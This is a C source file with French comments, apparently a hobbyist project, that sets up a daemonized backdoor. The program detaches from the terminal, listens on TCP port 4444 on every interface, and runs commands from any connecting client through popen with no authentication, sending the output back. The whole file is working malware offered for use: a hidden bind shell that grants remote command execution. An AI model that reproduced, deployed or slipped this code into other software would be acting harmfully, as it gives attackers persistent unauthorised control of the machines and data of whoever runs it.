//Auteur --> aiglematth
/*
Une backdoor daemonisée, permet d'exe des opérations non bloquantes (par exemple nano est impossible à utiliser sur cette backdoor)
*/
#include <stdio.h>    //printf
#include <stdlib.h>   //exit
#include <unistd.h>   //fork chdir sysconf
#include <signal.h>   //signal
#include <sys/stat.h> //umask
#include <sys/socket.h> //socket, bind, accept, AF_INET, SOCK_STREAM [...]
#include <arpa/inet.h>  //htons, htonl
#include <netinet/in.h> //sockaddr_in
#include <string.h>
#include <grp.h>	//getgrnam

#define BUFSIZE 1024
#define PORT 4444 //A modifier si vous le voulez

// ** SYNOPSYS ** //
//
// On cree notre fonction qui daemonize une autre fonction
//
// ** PARAM ** //
//
// - un pointeur vers une fonction qui retourne un entier et ne prend pas de paramètres
//
// ** RETOUR ** //
//
// - (-1) si la fonction callback c'est mal exe, sinon (0)
//
int dem(int (*callback)(void))
{
	//On va commencer par fork un premier coup
	pid_t pid = fork();

	//On va vérifier que le fork s'est effectuer
	if(pid < 0)
		exit(1);

	//On va tuer le process pere
	if(pid > 0)
		exit(0);

	//On va lancer une nouvelle session
	if(setsid() < 0)
		exit(1);

	//On est dans le daemon
	//On va lui donner les droits de base
	umask(0);

	//Un chdir de base (ici le path du programme)
	chdir("/");

	//On clos proprement les descripteurs (output, input, err)
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	//On lance la fonction et on vérifie le code retour
        if(callback() < 0)
		return -1; //Le callback retourne une erreur
	return 0; //Le callback retourne une bonne exe
}


// ** SYNOPSYS ** //
//
// On cree notre fonction backdoor
//
// ** PARAM ** //
//
// - aucun
//
// ** RETOUR ** //
//
// - (-1) si la fonction c'est mal exe, sinon (0)
//

int backdoor(void)
{
	//On crée les socket
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	int client = 0;
	//La taille en dur de la structure sockaddr_in
	int taille_pour_bind = 0;
	//La taille du buffer de réception des données
	char buffer[BUFSIZE] = {0};
	//La taille de la chaine de chars reçues afin de la vider plus rapidement
	int taille_recv = 0;
	//La taille de la chaine de chars resultant du popen, permet aussi de vider plus rapidement ce tableau (mettre à 0)
	int taille_res  = 0;
	//Le descripteur de fichier pour le popen
	FILE *commande = NULL;
	//Le buffer qui contiendra le resultat du popen
	char resultat[BUFSIZE] = {0};
	//On vérifie son intégrité
	if(sock == -1)
		exit(1);

	//On a la struct à caster pour lancer le bind
	struct sockaddr_in pour_bind = {0};
	pour_bind.sin_family = AF_INET;		       //La famille IPv4
	pour_bind.sin_port   = htons(PORT); 	       //Le port d'écoute
	pour_bind.sin_addr.s_addr = htons(INADDR_ANY); //Toutes les interfaces
	//On va bind le socket
	if( bind(sock, (struct sockaddr*)&pour_bind, sizeof(pour_bind)) < 0)
		exit(1);

	//On va listen
	if( listen(sock, 5) < 0)
		exit(1);

	//On va recup la taille de la struct pour_bind
	taille_pour_bind = sizeof(pour_bind);
	//On va accepter des connexions
	while(1)
	{
		//On récolte un client
		client = accept(sock, (struct sockaddr*)&pour_bind, &taille_pour_bind);
		//On vérifie le descripteur de son socket
		if(client >= 0)
		{
			//On va boucler et recevoir les commandes à exe
			while(1)
			{
				//On envoie un prompt
                                dprintf(client, "%s@%s:%s$ ",getlogin(), (*getgrnam(getlogin())).gr_name, getcwd(NULL, 0));
				//On récolte la taille pour vérifier qu'on a recu quelque chose (et aussi vider le buffer plus efficacement car moins de tours de boucle)
				taille_recv = recv(client, buffer, sizeof(buffer), 0);
				//Si on a recu quelque chose
				if( taille_recv > 0)
				{
					//On retire le \n de fin de chaîne
                                                if(buffer[strlen(buffer)-1] == '\n')
                                                        buffer[strlen(buffer)-1] = '\0';

					//On verifie que le mess est end et on quitte si oui
					if(strstr(buffer, "end") != NULL)
						break;
					//Si il veut eteindre la backdoor
					if(strstr(buffer, "shutdown_backdoor") != NULL)
						exit(0);
					//Si la commande est un cd (change directory) on traite ce cas afin véritablement le repertoire courant via chdir
					if(strstr(buffer, "cd") != NULL)
						chdir(buffer+3);
					else //Sinon on exe la commande via un popen
					{
						commande = popen(buffer, "r");
						//On tcheck que le popen a échoué afin d'envoyer ECHEC au client
						if(commande == NULL)
						{
							strcpy(resultat, "ECHEC");
							taille_res = strlen(resultat);
							send(client, resultat, taille_res, 0);
						}
						else //Sinon on envoie toutes les lignes contenues dans le descripteur de fichier du popen
						{
							while(fgets(resultat, sizeof(resultat), commande) != NULL) //Tant qu'on a pas un fgets NULL, on boucle (fgets est NULL quand il n'y a plus de contenu à lire)
                                           		{
				  	                       //On affecte a taille_res la taille de la chaine de chars resultat afin de vider celle-ci efficacement
                                                                taille_res = strlen(resultat);
								if(send(client, resultat, taille_res, 0) < 0)
									break;
								//On vide resultat afin d'envoyer un affichage propre
		                                		for(int i=0; i<taille_recv; i+=1)
                		                        		resultat[i] = 0;
							}
						}
						//On ferme le descripteur du popen
						fclose(commande);
					}
				}
				else //Si on a une erreur dans le recv on va fermer le socket du client
					break;
				//On remet le buffer à 0
				for(int i=0; i<taille_recv; i+=1)
					buffer[i] = 0;
				//Et le resultat (pas forcémment obligé car déjà vidé dans le while(fgets[...]), mais comme ca on est sur ^^)
				for(int i=0; i<sizeof(resultat); i+=1)
					resultat[i] = 0;
			}
		}
		//On en a fini avec lui, on ferme son descripteur
		close(client);
	}
	return 0;
}

int main(void)
{
	int conn = dem(backdoor);
	return 0;
}
